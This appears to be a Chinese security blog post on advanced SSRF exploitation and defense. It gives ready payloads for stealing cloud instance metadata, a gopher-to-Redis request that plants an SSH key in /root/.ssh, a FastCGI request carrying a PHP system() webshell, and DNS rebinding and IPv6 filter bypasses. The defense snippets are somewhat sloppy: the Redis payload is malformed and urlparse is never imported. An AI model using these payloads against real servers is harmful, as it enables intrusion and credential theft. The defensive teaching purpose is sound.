---
title: "高级 SSRF 技巧与防御 - 从内网探测到云环境接管"
date: 2026-03-01T10:00:00+08:00
draft: false
categories: ['漏洞复现']
tags: ['渗透测试', 'SSRF', '内网渗透']
image: "/blog-cover-default.jpg"
---

# 高级 SSRF 技巧与防御 - 从内网探测到云环境接管

## 📋 漏洞概述

**漏洞名称**: Server-Side Request Forgery (SSRF)  
**漏洞类型**: 服务端请求伪造  
**危害等级**: 🔴 高危  
**扩展场景**: 结合开放式重定向、DNS 重绑定等技术增强利用

---

## 🎯 漏洞原理回顾

### SSRF 基础原理

SSRF（服务端请求伪造）是一种允许攻击者诱导服务器发起非预期请求的漏洞。攻击者可以：

- 探测内网结构与拓扑
- 访问内网服务、设备管理接口
- 窃取云环境元数据
- 绕过防火墙和网络限制

### 高级利用

```
攻击者 → Web 应用 → 内网服务/云 API
         (被利用)
```

---

## 🧪 环境搭建

### 强化目标测试环境

- 选择复杂网络场景：存在多网卡、复杂路由表、VPN
- 利用流量分析工具辅助判断（WireShark、tcpdump）

### 常见弱点位置

1. **开放式重定向**: `GET /redirect?target=http://internal/api`
2. **代理回调接口**: `POST /proxy {"url": "http://..."}`
3. **突破网络边界**: `GET /fetch?url=http://internal:8080/sensitive`

---

## ⚔️ 漏洞利用策略

### 1️⃣ 云环境元数据窃取

#### Aliyun

```http
GET /fetch?url=http://100.100.100.200/latest/meta-data/ HTTP/1.1
```

敏感路径:
```
/latest/meta-data/instance-id
/latest/meta-data/network/interfaces/macs/
```

#### AWS

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

#### Tencent Cloud

```http
GET /fetch?url=http://metadata.tencentyun.com/latest/meta-data/ HTTP/1.1
```

### 2️⃣ 混合协议利用

#### Gopher + Redis

```http
GET /fetch?url=gopher://127.0.0.1:6379/_INFO HTTP/1.1
```

#### 攻击者写入 SSH 公钥
```
gopher://127.0.0.1:6379/_CONFIG SET dir /root/.ssh/_CONFIG SET dbfilename authorized_keys/_SET mykey "ssh-rsa AAAA..."/_SAVE
```

#### FastCGI 远程调用

```
gopher://127.0.0.1:9000/_fcgi?request_method=POST&content_type=application/x-www-form-urlencoded&content_length=38&body=<?php system($_GET[1]);?>
```

### 3️⃣ DNS 重绑定攻击

当目标过滤 IP 时，使用 DNS 重绑定绕过：

1. 注册域名 `attacker.com`
2. 首次解析为公网 IP（通过过滤）
3. 二次解析为内网 IP（实际请求）

**工具**: [rbndr](https://github.com/nccgroup/rbndr)

### 4️⃣ IPv6 探测

```http
GET /fetch?url=http://[::1]:8080/admin HTTP/1.1
GET /fetch?url=https://[0:0:0:0:0:ffff:7f00:1]:8080/api HTTP/1.1
```

---

## 🛡️ 高危防御方案

### 1. IP 地址验证

**白名单**：
确保只允许访问特定 IP

```python
import ipaddress

allowed_ipv4 = ["123.45.67.89", "98.76.54.32"]
allowed_ipv6 = ["2001:0db8:85a3::8a2e:0370:7334"]

def is_safe_ip(ip):
    return ip in allowed_ipv4 or ip.startswith(tuple([addr for addr in allowed_ipv6]))
```

### 2. 安全扫描

使用工具
- Burp Suite Collaborator
- Nmap 脚本引擎
- Nuclei

### 3. 网络隔离

- VLAN 划分
- DMZ
e.g.:
使用防火墙规则限制跨网段访问

### 4. 过滤偏离协议内容

阻止 gopher 或 ftp 指定协议访问

#### 示例代码

```python
ALLOWED_PROTOCOLS = ['http', 'https']

def validate_protocol(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_PROTOCOLS:
        raise ValueError("Disallowed scheme detected!")
```

---

## 🎯 产业案例与防御建议

### 真实案例分析

#### 某电商平台
强调内部帐户系统和货品管理端口的安全性

**漏洞点**: 内部 API 泄露
**利用链**: SSRF + DNS Rebinding 引导外部流量至内部接口
**影响**: 内部系统数据泄漏与资金窃取

---

## 🎓 学习资源

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [NCC Group Rebinding Tool (rbndr)](https://github.com/nccgroup/rbndr)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)

---

**标签**: #SSRF #Web 安全 #漏洞复现 #SRC #云安全